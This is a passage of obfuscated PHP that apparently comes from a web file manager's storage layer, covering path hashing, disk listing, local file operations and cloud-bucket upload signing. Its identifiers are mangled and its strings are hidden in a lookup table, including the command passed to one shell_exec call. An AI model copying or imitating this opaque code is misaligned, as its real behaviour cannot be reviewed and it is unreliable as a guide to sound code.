self::makePath(self::KOD_USER_FILE_TAG, $ê”…Û‹Œ); } public static function makePath($ „¹¿åô, $ÛÛ´Ä¦ˆ = '', $Ÿè×³« = '') { $¸¾íµ¹ =& $_SERVER[™¸œØ®Ü]; $çéõ‡ßó = substr($ „¹¿åô, 1, -1); $Ÿæìû¼Æ = $¸¾íµ¹[1386] . $çéõ‡ßó . $¸¾íµ¹[1387] . $ÛÛ´Ä¦ˆ . $¸¾íµ¹[1388]; $Ÿæìû¼Æ = $Ÿè×³« ? $Ÿæìû¼Æ . $Ÿè×³« . $¸¾íµ¹[8] : $Ÿæìû¼Æ; return $Ÿæìû¼Æ; } public static function hashPath($”µ±ô¸÷, $ö—Äïšï = true) { $„­ò§ê =& $_SERVER[™¸œØ®Ü]; $­Î¼¨Ô¼ = is_array($”µ±ô¸÷) ? $”µ±ô¸÷ : IO::info($”µ±ô¸÷); $†ì¬ùô¤ = _get($­Î¼¨Ô¼, $„­ò§ê[1389], $„­ò§ê[12]); if (!$†ì¬ùô¤ && isset($­Î¼¨Ô¼[$„­ò§ê[237]])) { $†ì¬ùô¤ = trim($­Î¼¨Ô¼[$„­ò§ê[237]], $„­ò§ê[121]); } if (!$†ì¬ùô¤ && isset($­Î¼¨Ô¼[$„­ò§ê[193]]) && $­Î¼¨Ô¼[$„­ò§ê[193]]) { $­Î¼¨Ô¼ = IO::info(KodIO::make($­Î¼¨Ô¼[$„­ò§ê[193]])); $†ì¬ùô¤ = _get($­Î¼¨Ô¼, $„­ò§ê[1389], $„­ò§ê[12]); } $…„¬†Á = md5($­Î¼¨Ô¼[$„­ò§ê[87]] . $­Î¼¨Ô¼[$„­ò§ê[79]] . $­Î¼¨Ô¼[$„­ò§ê[88]]); if (!$†ì¬ùô¤ && file_exists($­Î¼¨Ô¼[$„­ò§ê[87]])) { $†ì¬ùô¤ = Cache::get($…„¬†Á . $„­ò§ê[1390]); $†ì¬ùô¤ = !1; if (!$†ì¬ùô¤) { $†ì¬ùô¤ = IO::hashSimple($­Î¼¨Ô¼[$„­ò§ê[87]]); Cache::set($…„¬†Á . $„­ò§ê[1390], $†ì¬ùô¤, 3600 * 24 * 30); } } if ($ö—Äïšï && !$†ì¬ùô¤) { } return $†ì¬ùô¤ ? $†ì¬ùô¤ : $…„¬†Á; } public static function hashPathSafe($°ŒµÅ, $ù¬ä×´Ã = true) { $ºÃï€Š =& $_SERVER[™¸œØ®Ü]; $Ü¢´Ø†ê = self::hashPath($°ŒµÅ, $ù¬ä×´Ã); return md5($Ü¢´Ø†ê . $ºÃï€Š[1391] . Model($ºÃï€Š[855])->get($ºÃï€Š[856])); } public static function initSystemPath() { $½ªØİ§ˆ =& $_SERVER[™¸œØ®Ü]; if (defined($½ªØİ§ˆ[1392])) { return; } define($½ªØİ§ˆ[1392], self::systemPath($½ªØİ§ˆ[191])); define($½ªØİ§ˆ[1393], self::systemPath($½ªØİ§ˆ[1394])); define($½ªØİ§ˆ[1395], self::systemPath($½ªØİ§ˆ[1396])); define($½ªØİ§ˆ[1397], self::systemPath($½ªØİ§ˆ[1398])); IOHistory::bindEvent(); } public static function systemPath($š«ÁÙô˜) { $ã…Ş‡® =& $_SERVER[™¸œØ®Ü]; $ôªŸÊÆ = $ã…Ş‡®[1399] . ucfirst($š«ÁÙô˜); $ìç÷À×é = Model($ã…Ş‡®[855])->get($ôªŸÊÆ); if ($ìç÷À×é) { return $ìç÷À×é; } if ($š«ÁÙô˜ == $ã…Ş‡®[191]) { $ìç÷À×é = self::make(Model($ã…Ş‡®[915])->systemRootPathAdd($ã…Ş‡®[612])); } else { $ìç÷À×é = self::systemPath($ã…Ş‡®[191]); $¼àÕ¬‰ = self::sourceID($ìç÷À×é); $ìç÷À×é = self::make(Model($ã…Ş‡®[915])->mkdir($¼àÕ¬‰, $š«ÁÙô˜)); } Model($ã…Ş‡®[855])->set($ôªŸÊÆ, $ìç÷À×é); return $ìç÷À×é; } public static function systemFolder($Óò“’â) { $íÊş¨˜Ú = IO_PATH_SYSTEM_SOURCE . $Óò“’â; $ôó‘¢¢¢ = Cache::get($íÊş¨˜Ú); if (!$ôó‘¢¢¢) { $©µæöŒ = IO::infoFullSimple($íÊş¨˜Ú); if (!$©µæöŒ) { $ôó‘¢¢¢ = IO::mkdir($íÊş¨˜Ú, REPEAT_SKIP); } else { $ôó‘¢¢¢ = $©µæöŒ[$_SERVER[™¸œØ®Ü][87]]; } Cache::set($íÊş¨˜Ú, $ôó‘¢¢¢, 3600 * 10); } return $ôó‘¢¢¢; } public static function defaultDriver() { return Model($_SERVER[™¸œØ®Ü][852])->defaultDriver(); } public static function defaultIO() { $§Æ òí¢ =& $_SERVER[™¸œØ®Ü]; $Ÿø²ìäÑ = self::defaultDriver(); return $§Æ òí¢[1400] . $Ÿø²ìäÑ[$§Æ òí¢[477]] . $§Æ òí¢[1388]; } public static function defaultDriverInit() { static $ÅòÄ›Ö = false; if ($ÅòÄ›Ö) { return $ÅòÄ›Ö; } $ÅòÄ›Ö = IO::init(self::defaultIO()); return $ÅòÄ›Ö; } public static function fileTypeList() { $ùÑÉà› =& $_SERVER[™¸œØ®Ü]; $¨òçì = $GLOBALS[$ùÑÉà›[6]][$ùÑÉà›[1401]]; foreach ($¨òçì as $ĞüÁ´¼ => $­†Æ—†±) { $”ü÷‡¹ó = $ùÑÉà›[1402] . $ĞüÁ´¼; $ôæˆúÆØ = LNG($”ü÷‡¹ó); if ($”ü÷‡¹ó != $ôæˆúÆØ) { $¨òçì[$ĞüÁ´¼][$ùÑÉà›[32]] = $ôæˆúÆØ; } } return $¨òçì; } public static function diskList($¾˜¯û¯® = true) { $††õ¶–½ = $_SERVER[™¸œØ®Ü][1403]; if ($¾˜¯û¯®) { $åë³ëš« = Cache::get($††õ¶–½); if (is_array($åë³ëš«)) { return $åë³ëš«; } } $åë³ëš« = self::diskListGet(); Cache::set($††õ¶–½, $åë³ëš«, 60); return $åë³ëš«; } public static function diskListGet() { $ÒÉùĞä” =& $_SERVER[™¸œØ®Ü]; $·£ìËûª = array(); if ($GLOBALS[$ÒÉùĞä”[6]][$ÒÉùĞä”[1404]] == $ÒÉùĞä”[1405]) { $¦Öëòëª = $ÒÉùĞä”[1406]; for ($Æˆèş±Ì = 0; $Æˆèş±Ì < strlen($¦Öëòëª); $Æˆèş±Ì++) { $•ä”¦Ò¬ = $¦Öëòëª[$Æˆèş±Ì] . $ÒÉùĞä”[1407]; if (file_exists($•ä”¦Ò¬)) { $·£ìËûª[] = $•ä”¦Ò¬; } } return $·£ìËûª; } if (!function_exists($ÒÉùĞä”[101])) { $·£ìËûª[] = $ÒÉùĞä”[926]; return $·£ìËûª; } $ÌéØüœ½ = explode($ÒÉùĞä”[287], shell_exec($ÒÉùĞä”[1408])); array_shift($ÌéØüœ½); array_pop($ÌéØüœ½); $ã¾ñ Å« = array($ÒÉùĞä”[1409], $ÒÉùĞä”[1410], $ÒÉùĞä”[1411], $ÒÉùĞä”[1412], $ÒÉùĞä”[1413], $ÒÉùĞä”[1414], $ÒÉùĞä”[1415], $ÒÉùĞä”[1416]); foreach ($ÌéØüœ½ as $¤¸‹’Ãİ) { $ğŞ»µ‰‘ = preg_split($ÒÉùĞä”[1417], $¤¸‹’Ãİ); $•ä”¦Ò¬ = $ğŞ»µ‰‘[count($ğŞ»µ‰‘) - 1]; if (!strstr($ğŞ»µ‰‘[0], $ÒÉùĞä”[1418]) || !$•ä”¦Ò¬) { continue; } $­ò»À„ì = rtrim($•ä”¦Ò¬, $ÒÉùĞä”[8]) . $ÒÉùĞä”[8]; if (in_array($­ò»À„ì, $ã¾ñ Å«)) { continue; } $·£ìËûª[] = $­ò»À„ì; } return $·£ìËûª; } public static function isSameDisk($àÊÇİ¤, $„œ€¾ –) { $«üîñ³¢ =& $_SERVER[™¸œØ®Ü]; if ($GLOBALS[$«üîñ³¢[6]][$«üîñ³¢[1404]] == $«üîñ³¢[1405]) { return strtolower(substr($àÊÇİ¤, 0, 1)) == strtolower(substr($„œ€¾ –, 0, 1)); } $Å¬ÈÓÈ = stat($àÊÇİ¤); $°ö°ù€ = stat($„œ€¾ –); if ($Å¬ÈÓÈ === !1 || $°ö°ù€ === !1) { return !1; } return $Å¬ÈÓÈ[$«üîñ³¢[1419]] === $°ö°ù€[$«üîñ³¢[1419]]; $ÔÆ¦Úƒ = self::diskList(); $¦¼ ÓûÂ = !1; $ìİ‹ôù = !1; sort($ÔÆ¦Úƒ); $ÔÆ¦Úƒ = array_reverse($ÔÆ¦Úƒ); $àÊÇİ¤ = rtrim($àÊÇİ¤, $«üîñ³¢[8]) . $«üîñ³¢[8]; $„œ€¾ – = rtrim($„œ€¾ –, $«üîñ³¢[8]) . $«üîñ³¢[8]; foreach ($ÔÆ¦Úƒ as $Ã¨â„¡¯) { $öÓ™Êº¾ = strlen($Ã¨â„¡¯); if (!$¦¼ ÓûÂ && substr($àÊÇİ¤, 0, $öÓ™Êº¾) == $Ã¨â„¡¯) { $¦¼ ÓûÂ = $Ã¨â„¡¯; } if (!$ìİ‹ôù && substr($„œ€¾ –, 0, $öÓ™Êº¾) == $Ã¨â„¡¯) { $ìİ‹ôù = $Ã¨â„¡¯; } if ($¦¼ ÓûÂ && $ìİ‹ôù) { break; } } return $¦¼ ÓûÂ === $ìİ‹ôù; } public static function transferType($¡€¡…­‘, $¼Š´Ï) { $©Ìµ²© =& $_SERVER[™¸œØ®Ü]; $Å¹«¦ÜÎ = self::driverType($¡€¡…­‘); $æ¦Úúğ‡ = self::driverType($¼Š´Ï); if ($Å¹«¦ÜÎ[$©Ìµ²©[33]] == $æ¦Úúğ‡[$©Ìµ²©[33]] && $Å¹«¦ÜÎ[$©Ìµ²©[1420]] == $æ¦Úúğ‡[$©Ìµ²©[1420]]) { return $©Ìµ²©[1421]; } if ($Å¹«¦ÜÎ[$©Ìµ²©[33]] == $©Ìµ²©[960] && $æ¦Úúğ‡[$©Ìµ²©[33]] == $©Ìµ²©[109]) { return $©Ìµ²©[1298]; } if ($Å¹«¦ÜÎ[$©Ìµ²©[33]] == $©Ìµ²©[109] && $æ¦Úúğ‡[$©Ìµ²©[33]] == $©Ìµ²©[960]) { return $©Ìµ²©[110]; } return $©Ìµ²©[1422]; } public static function driverType($Ò“ƒ¾§) { $Ş’» ¢¨ =& $_SERVER[™¸œØ®Ü]; $–Ïè¡îÕ = str_replace($Ş’» ¢¨[1423], $Ş’» ¢¨[12], strtolower($Ò“ƒ¾§->getType())); if ($–Ïè¡îÕ == $Ş’» ¢¨[842] || $–Ïè¡îÕ == $Ş’» ¢¨[1424] || $–Ïè¡îÕ == $Ş’» ¢¨[1425]) { $Ò“ƒ¾§ = self::defaultDriverInit(); } else { if ($–Ïè¡îÕ == $Ş’» ¢¨[1308] || $–Ïè¡îÕ == $Ş’» ¢¨[1426]) { $Ò“ƒ¾§ = IO::init($Ò“ƒ¾§->pathParse[$Ş’» ¢¨[1251]]); } } $é£âÑŠ = $Ò“ƒ¾§->path; $–Ïè¡îÕ = str_replace($Ş’» ¢¨[1423], $Ş’» ¢¨[12], strtolower($Ò“ƒ¾§->getType())); if ($–Ïè¡îÕ == $Ş’» ¢¨[109]) { return array($Ş’» ¢¨[33] => $Ş’» ¢¨[109], $Ş’» ¢¨[1420] => $Ş’» ¢¨[12], $Ş’» ¢¨[87] => $é£âÑŠ, $Ş’» ¢¨[98] => $Ò“ƒ¾§); } return array($Ş’» ¢¨[33] => $Ş’» ¢¨[960], $Ş’» ¢¨[1420] => $Ò“ƒ¾§->pathDriver, $Ş’» ¢¨[87] => $é£âÑŠ, $Ş’» ¢¨[98] => $Ò“ƒ¾§); } public static function pathDriverType($·Ò›­Çç) { return $·Ò›­Çç ? self::driverType(IO::init($·Ò›­Çç)) : !1; } public static function pathDriverLocal($Š›™‘ı) { $Ôíïèıé =& $_SERVER[™¸œØ®Ü]; $íÍ…ôå = $Š›™‘ı ? self::driverType(IO::init($Š›™‘ı)) : !1; return strtolower($íÍ…ôå[$Ôíïèıé[33]]) == $Ôíïèıé[109] ? !0 : !1; } public static function allowCover($ÈÉæ”Í, $¿“ºİ·Ã = true) { $ØÓ¼Ë¦Í =& $_SERVER[™¸œØ®Ü]; if (is_string($ÈÉæ”Í)) { $ÈÉæ”Í = IO::info($ÈÉæ”Í); } if (!$ÈÉæ”Í || $ÈÉæ”Í[$ØÓ¼Ë¦Í[33]] == $ØÓ¼Ë¦Í[78] || $ÈÉæ”Í[$ØÓ¼Ë¦Í[79]] <= 100) { return !1; } if (isset($ÈÉæ”Í[$ØÓ¼Ë¦Í[1427]]) || !$ÈÉæ”Í[$ØÓ¼Ë¦Í[87]]) { return !1; } if (isset($ÈÉæ”Í[$ØÓ¼Ë¦Í[234]]) && !$ÈÉæ”Í[$ØÓ¼Ë¦Í[234]]) { return !1; } static $µÎÍóìÁ = false; if (!$µÎÍóìÁ || !$¿“ºİ·Ã) { $ê¢ÄÃÉ = self::driverType(IO::init($ÈÉæ”Í[$ØÓ¼Ë¦Í[87]])); $ü„ìµÛ› = $ê¢ÄÃÉ[$ØÓ¼Ë¦Í[98]]; $µÎÍóìÁ = $ØÓ¼Ë¦Í[196]; if ($ê¢ÄÃÉ[$ØÓ¼Ë¦Í[33]] == $ØÓ¼Ë¦Í[109]) { $µÎÍóìÁ = $ØÓ¼Ë¦Í[1428]; } if ($ê¢ÄÃÉ[$ØÓ¼Ë¦Í[98]] && is_array($ê¢ÄÃÉ[$ØÓ¼Ë¦Í[98]]->config)) { $¼€ó«—¿ = $ê¢ÄÃÉ[$ØÓ¼Ë¦Í[98]]->config; if (isset($¼€ó«—¿[$ØÓ¼Ë¦Í[1429]]) && $¼€ó«—¿[$ØÓ¼Ë¦Í[1429]]) { $µÎÍóìÁ = $ØÓ¼Ë¦Í[1428]; } } $ôˆœõÊ = KodIO::defaultDriver(); if (strtolower($ôˆœõÊ[$ØÓ¼Ë¦Í[98]]) == $ØÓ¼Ë¦Í[109] && is_array($ôˆœõÊ[$ØÓ¼Ë¦Í[6]])) { $ç•«Ã±ô = $ôˆœõÊ[$ØÓ¼Ë¦Í[6]][$ØÓ¼Ë¦Í[1281]]; if (substr($ç•«Ã±ô, 0, 2) == $ØÓ¼Ë¦Í[1430]) { $ç•«Ã±ô = str_replace($ØÓ¼Ë¦Í[1430], BASIC_PATH, $ç•«Ã±ô); } $ç•«Ã±ô = str_replace($ØÓ¼Ë¦Í[256], $ØÓ¼Ë¦Í[8], $ç•«Ã±ô); if (substr($ÈÉæ”Í[$ØÓ¼Ë¦Í[87]], 0, strlen($ç•«Ã±ô)) == $ç•«Ã±ô) { $µÎÍóìÁ = $ØÓ¼Ë¦Í[196]; } } } return $µÎÍóìÁ == $ØÓ¼Ë¦Í[1428] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¸öÇôëË) { parent::__construct($¸öÇôëË); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($’äı¶á¤) { $‹ÒÛšÅ” =& $_SERVER[™¸œØ®Ü]; if (substr($’äı¶á¤, 0, 7) == $‹ÒÛšÅ”[218]) { $’äı¶á¤ = $‹ÒÛšÅ”[219] . substr($’äı¶á¤, 7); } header($‹ÒÛšÅ”[175] . $’äı¶á¤); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($óÜ®…æ·) { parent::__construct($óÜ®…æ·); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } public function uploadFormData($óƒÙË×, $Úéæ¥ü– = 3600) { $Ò¦à–¹ı =& $_SERVER[™¸œØ®Ü]; $®‰å„ß” = $Ò¦à–¹ı[231]; $æ¢‰ÑÏë = $Ò¦à–¹ı[1431]; $ıÌãÌùö = $Ò¦à–¹ı[263]; $ªÍ™®ÇÍ = gmdate($Ò¦à–¹ı[1432], time() + $Úéæ¥ü–); $Ö¼íâ½ = (string) time() . $Ò¦à–¹ı[74] . (string) (time() + $Úéæ¥ü–); $ëÒ÷ğ”ô = array($Ò¦à–¹ı[264] => $ªÍ™®ÇÍ, $Ò¦à–¹ı[267] => array(array($Ò¦à–¹ı[308] => $®‰å„ß”), array($Ò¦à–¹ı[268] => $this->bucket), array($Ò¦à–¹ı[269], $Ò¦à–¹ı[270], $Ò¦à–¹ı[12]), array($Ò¦à–¹ı[272] => $ıÌãÌùö), array($Ò¦à–¹ı[1433] => $æ¢‰ÑÏë), array($Ò¦à–¹ı[1434] => $this->accessKey), array($Ò¦à–¹ı[1435] => $Ö¼íâ½))); $ëÒ÷ğ”ô = json_encode($ëÒ÷ğ”ô); $êÛÅº¯é = hash_hmac($Ò¦à–¹ı[1431], $Ö¼íâ½, $this->secret); $í¤éÔ”ƒ = sha1($ëÒ÷ğ”ô); $§²§Ñ‚á = hash_hmac($Ò¦à–¹ı[1431], $í¤éÔ”ƒ, $êÛÅº¯é); $í˜ñ…õ³ = array($Ò¦à–¹ı[308] => $®‰å„ß”, $Ò¦à–¹ı[272] => $ıÌãÌùö, $Ò¦à–¹ı[279] => base64_encode($ëÒ÷ğ”ô), $Ò¦à–¹ı[1433] => $æ¢‰ÑÏë, $Ò¦à–¹ı[1434] => $this->accessKey, $Ò¦à–¹ı[1436] => $Ö¼íâ½, $Ò¦à–¹ı[1437] => $§²§Ñ‚á, $Ò¦à–¹ı[208] => $this->getHost()); return $í˜ñ…õ³; } public function fileOutImage($ÒÀòğ­, $¹×‰î  = 250) { $â¿’Ô¯ =& $_SERVER[™¸œØ®Ü]; if ($this->size($ÒÀòğ­) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÒÀòğ­, $¹×‰î ); } $è–Şˆó» = $this->link($ÒÀòğ­); $è–Şˆó» .= $â¿’Ô¯[1438] . $¹×‰î  . $â¿’Ô¯[1439]; $this->fileOutLink($è–Şˆó»); } public function fileOutLink($Ì³Ø”£İ) { $ÄŸ—³Ú× =& $_SERVER[™¸œØ®Ü]; if (substr($Ì³Ø”£İ, 0, 7) == $ÄŸ—³Ú×[218]) { $Ì³Ø”£İ = $ÄŸ—³Ú×[219] . substr($Ì³Ø”£İ, 7); } header($ÄŸ—³Ú×[175] . $Ì³Ø”£İ); die; } } goto AØÈçöÚÀŠ; dµã³²ù©‘: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($÷şÖãí) { parent::__construct($÷şÖãí); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } public function uploadLink($ÎèĞ®’ü, $äà¢³Ê› = 0) { $Ë¤‚Ì¨Ç =& $_SERVER[™¸œØ®Ü]; if ($this->isUploadServer()) { return; } $ˆ®ÒøŸÀ = $this->getType(); if (!in_array($ˆ®ÒøŸÀ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ï¨†îü÷ = (!$äà¢³Ê› ? 1 : ceil($äà¢³Ê› / pow(1024, 3))) * 3600 * 4; $ëõ€ÚÔ‚ = $this->uploadMultiData($ÎèĞ®’ü, $ï¨†îü÷); if ($ëõ€ÚÔ‚) { $ëõ€ÚÔ‚[$Ë¤‚Ì¨Ç[97]] = $ÎèĞ®’ü; $ëõ€ÚÔ‚[$Ë¤‚Ì¨Ç[98]] = $ˆ®ÒøŸÀ; } return $ëõ€ÚÔ‚; } public function fileOutImage($Ï€‹ªí, $ËßÒñ›Â = 250) { if ($this->size($Ï€‹ªí) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ï€‹ªí, $ËßÒñ›Â); } $§³±ÅáÚ = $this->link($Ï€‹ªí); $§³±ÅáÚ .= $_SERVER[™¸œØ®Ü][1476] . $ËßÒñ›Â; $this->fileOutLink($§³±ÅáÚ); } public function fileOutLink($Îş¦„ú) { $Êèˆ¯Ù“ =& $_SERVER[™¸œØ®Ü]; if (substr($Îş¦„ú, 0, 7) == $Êèˆ¯Ù“[218]) { $Îş¦„ú = $Êèˆ¯Ù“[219] . substr($Îş¦„ú, 7); } header($Êèˆ¯Ù“[175] . $Îş¦„ú); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($øû•ÃØ) { if (substr($øû•ÃØ, 0, 2) == $_SERVER[™¸œØ®Ü][1430]) { $øû•ÃØ = BASIC_PATH . substr($øû•ÃØ, 2); } return $øû•ÃØ; } public function iconvApp($ïæû«®Û) { $ï¤úéôİ =& $_SERVER[™¸œØ®Ü]; global $config; return $this->iconvTo($ïæû«®Û, $config[$ï¤úéôİ[1462]], $config[$ï¤úéôİ[1461]]); } public function iconvSystem($ŠâîìÔ—) { $Ê¿‹± =& $_SERVER[™¸œØ®Ü]; global $config; return $this->iconvTo($ŠâîìÔ—, $config[$Ê¿‹±[1461]], $config[$Ê¿‹±[1462]]); } public function getPathOuter($µ€šÚôã) { $Éš©ëÓ‚ =& $_SERVER[™¸œØ®Ü]; $«ü’…Íı = $this->iconvApp($this->pathBase); $µ€šÚôã = $this->iconvApp($µ€šÚôã); if (substr($«ü’…Íı, 0, 2) == $Éš©ëÓ‚[1430]) { $«ü’…Íı = BASIC_PATH . substr($«ü’…Íı, 2); } if (substr($µ€šÚôã, 0, 2) == $Éš©ëÓ‚[1430]) { $µ€šÚôã = BASIC_PATH . substr($µ€šÚôã, 2); } $«ü’…Íı = KodIO::clear($«ü’…Íı); $µ€šÚôã = KodIO::clear($µ€šÚôã); $µ€šÚôã = substr($µ€šÚôã, strlen($«ü’…Íı)); if (empty($this->pathDriver)) { return $µ€šÚôã; } return $this->pathDriver . $Éš©ëÓ‚[8] . ltrim($µ€šÚôã, $Éš©ëÓ‚[8]); } public function mkfile($ÚÖ“¼§, $†ğÑãÈŒ = '', $ŞæÊ÷¸á = REPEAT_RENAME) { $ÚÖ“¼§ = $this->iconvSystem($ÚÖ“¼§); @touch($ÚÖ“¼§); if ($†ğÑãÈŒ) { file_put_contents($ÚÖ“¼§, $†ğÑãÈŒ); } @chmod($ÚÖ“¼§, $this->pathAuth); if (is_file($ÚÖ“¼§)) { return $this->getPathOuter($ÚÖ“¼§); } $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } public function mkdir($ñÛÄÂ€á, $õÕ„·ù = REPEAT_SKIP) { $ñÛÄÂ€á = $this->iconvSystem($ñÛÄÂ€á); if (is_dir($ñÛÄÂ€á)) { return $this->getPathOuter($ñÛÄÂ€á); } @mkdir($ñÛÄÂ€á, $this->pathAuth, !0); @chmod($ñÛÄÂ€á, $this->pathAuth); if (is_dir($ñÛÄÂ€á)) { return $this->getPathOuter($ñÛÄÂ€á); } $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } public function copyFile($¬åæïÔ¶, $õ—Œ× ) { $this->mkdir($this->pathFather($õ—Œ× )); $¬åæïÔ¶ = $this->iconvSystem($¬åæïÔ¶); $õ—Œ×  = $this->iconvSystem($õ—Œ× ); $É‚“íØÉ = copy_64($¬åæïÔ¶, $õ—Œ× ); @chmod($õ—Œ× , $this->pathAuth); if ($É‚“íØÉ) { return $this->getPathOuter($õ—Œ× ); } $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } public function moveFile($¼‰úşË±, $şƒ±¬İù) { $this->mkdir($this->pathFather($şƒ±¬İù)); $¼‰úşË± = $this->iconvSystem($¼‰úşË±); $şƒ±¬İù = $this->iconvSystem($şƒ±¬İù); $ÒĞ§Ò = intval(@rename($¼‰úşË±, $şƒ±¬İù)); if (!$ÒĞ§Ò) { if ($ÒĞ§Ò = intval(@copy_64($¼‰úşË±, $şƒ±¬İù))) { @unlink($¼‰úşË±); } } @chmod($şƒ±¬İù, $this->pathAuth); if ($ÒĞ§Ò) { return $this->getPathOuter($şƒ±¬İù); } $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } public function movePath($ßØ ±­”, $©Š³à…æ, $Ê¥Ô£”ª = false) { $ÑïßÍ—Å =& $_SERVER[™¸œØ®Ü]; $ßØ ±­” = $this->iconvSystem($ßØ ±­”); $©Š³à…æ = $this->iconvSystem($©Š³à…æ); $¡âğ›Šå = rtrim($©Š³à…æ, $ÑïßÍ—Å[8]) . $ÑïßÍ—Å[8] . ($Ê¥Ô£”ª ? $Ê¥Ô£”ª : get_path_this($ßØ ±­”)); if (file_exists($¡âğ›Šå)) { return !1; } $±Ÿëª‡Ÿ = intval(@rename($ßØ ±­”, $¡âğ›Šå)); $±Ÿëª‡Ÿ = file_exists($¡âğ›Šå); if ($±Ÿëª‡Ÿ) { return $this->getPathOuter($¡âğ›Šå); } $this->writeLog(__FUNCTION__ . $ÑïßÍ—Å[1473], !0); return !1; } public function delFile($ö´á÷Æ) { $ö´á÷Æ = $this->iconvSystem($ö´á÷Æ); if (!@unlink($ö´á÷Æ)) { @chmod($ö´á÷Æ, $this->pathAuth); if (@unlink($ö´á÷Æ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } return !0; } public function delFolder($ØÈí´â¸) { $é ¯øúÎ =& $_SERVER[™¸œØ®Ü]; $ØÈí´â¸ = $this->iconvSystem($ØÈí´â¸); if (!is_dir($ØÈí´â¸)) { return !0; } if (!($’©è¤³û = opendir($ØÈí´â¸))) { return !1; } while (($¬ã…Ñ¶Ö = readdir($’©è¤³û)) !== !1) { if ($¬ã…Ñ¶Ö == $é ¯øúÎ[10] || $¬ã…Ñ¶Ö == $é ¯øúÎ[1382]) { continue; } $µ÷·¾úË = $ØÈí´â¸ . $é ¯øúÎ[8] . $¬ã…Ñ¶Ö; if (is_file($µ÷·¾úË) || is_link($µ÷·¾úË)) { if (!unlink($µ÷·¾úË)) { chmod($µ÷·¾úË, $this->pathAuth); if (!unlink($µ÷·¾úË)) { return !1; } } } else { if (is_dir($µ÷·¾úË)) { chmod($µ÷·¾úË, $this->pathAuth); $µ÷·¾úË = $this->iconvApp($µ÷·¾úË); if (!$this->delFolder($µ÷·¾úË)) { return !1; } } } } closedir($’©è¤³û); return rmdir($ØÈí´â¸); } public function rename($ù¨¿®á, $İŞ‡†˜é) { $Í‡É­® =& $_SERVER[™¸œØ®Ü]; $…âÚåò¤ = $this->fileNameAuto($this->pathFather($ù¨¿®á), $İŞ‡†˜é); $…âÚåò¤ = $this->iconvSystem($…âÚåò¤); $ù¨¿®á = $this->iconvSystem($ù¨¿®á); $ò¯œÙÇ£ = $this->pathFather($ù¨¿®á); $‘ÆçãŸÎ = rtrim($ò¯œÙÇ£, $Í‡É­®[8]) . $Í‡É­®[8] . $…âÚåò¤; $À´úË÷— = @rename($ù¨¿®á, $‘ÆçãŸÎ); $‘ÆçãŸÎ = $this->iconvApp($‘ÆçãŸÎ); if ($À´úË÷—) { return $this->getPathOuter($‘ÆçãŸÎ); } $this->writeLog(__FUNCTION__ . $Í‡É­®[1473], !0); return !1; } public function size($¼°¤ûÑÕ) { $¼°¤ûÑÕ = $this->iconvSystem($¼°¤ûÑÕ); return filesize_64($¼°¤ûÑÕ); } public function info($åÍÄÈç’) { $åÍÄÈç’ = $this->iconvSystem($åÍÄÈç’); if ($this->isFolder($åÍÄÈç’)) { return $this->folderInfo($åÍÄÈç’); } else { if ($this->isFile($åÍÄÈç’)) { return $this->fileInfo($åÍÄÈç’); } } return !1; } protected function infoChildren($Ù‹È•İÍ, &$‹Ù‚‚½, $ºê‚¾„ = true) { $¡®îÜÌ° =& $_SERVER[™¸œØ®Ü]; check_abort_echo(); $Ù‹È•İÍ = rtrim($Ù‹È•İÍ, $¡®îÜÌ°[8]) . $¡®îÜÌ°[8]; if ($ºê‚¾„) { $Ù‹È•İÍ = $this->iconvSystem($Ù‹È•İÍ); } if (!($õÂíÍëÙ = @opendir($Ù‹È•İÍ))) { return; } while (($¿Æ§ìà° = readdir($õÂíÍëÙ)) !== !1) { if ($¿Æ§ìà° == $¡®îÜÌ°[10] || $¿Æ§ìà° == $¡®îÜÌ°[1382]) { continue; } $Ôîüı£Ó = $Ù‹È•İÍ . $¿Æ§ìà°; if (is_file($Ôîüı£Ó) || is_link($Ôîüı£Ó)) { $‹Ù‚‚½[$¡®îÜÌ°[80]]++; $‹Ù‚‚½[$¡®îÜÌ°[79]] += filesize_64($Ôîüı£Ó); } else { if (is_dir($Ôîüı£Ó)) { $‹Ù‚‚½[$¡®îÜÌ°[81]]++; $this->infoChildren($Ôîüı£Ó, $‹Ù‚‚½, !1); } } } closedir($õÂíÍëÙ); } private function folderInfo($¿ÓÀ½¿ô, $§½Ûí±Ì = false) { $×‘ïÃ» =& $_SERVER[™¸œØ®Ü]; $¿ÓÀ½¿ô = rtrim($¿ÓÀ½¿ô, $×‘ïÃ»[8]) . $×‘ïÃ»[8]; $—Ûâß•Ü = $this->iconvApp($this->pathThis($¿ÓÀ½¿ô)); if ($§½Ûí±Ì) { return array($×‘ïÃ»[32] => $—Ûâß•Ü, $×‘ïÃ»[87] => $this->getPathOuter($¿ÓÀ½¿ô), $×‘ïÃ»[33] => $×‘ïÃ»[78]); } $æ¬•ıä = array($×‘ïÃ»[32] => $—Ûâß•Ü, $×‘ïÃ»[87] => $this->getPathOuter($¿ÓÀ½¿ô), $×‘ïÃ»[33] => $×‘ïÃ»[78], $×‘ïÃ»[233] => @filectime($¿ÓÀ½¿ô), $×‘ïÃ»[88] => @filemtime($¿ÓÀ½¿ô), $×‘ïÃ»[1477] => @fileatime($¿ÓÀ½¿ô), $×‘ïÃ»[1478] => is_readable($¿ÓÀ½¿ô), $×‘ïÃ»[1479] => is_writable($¿ÓÀ½¿ô), $×‘ïÃ»[1480] => get_mode($¿ÓÀ½¿ô)); return $æ¬•ıä; } private function fileInfo($‘ä´çÈì, 